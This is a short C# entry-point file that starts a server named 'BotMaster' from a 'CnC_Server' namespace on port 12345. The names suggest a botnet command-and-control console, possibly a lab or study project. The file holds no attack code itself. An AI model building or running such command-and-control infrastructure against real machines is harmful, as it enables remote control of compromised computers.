using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using Server.CnC_Server;

namespace Server.CnC_CLI
{
    class Program
    {
        static void Main(string[] args)
        {
            CnC_Server.Server BotMaster = new CnC_Server.Server(12345);
            BotMaster.Start();
        }
    }
}
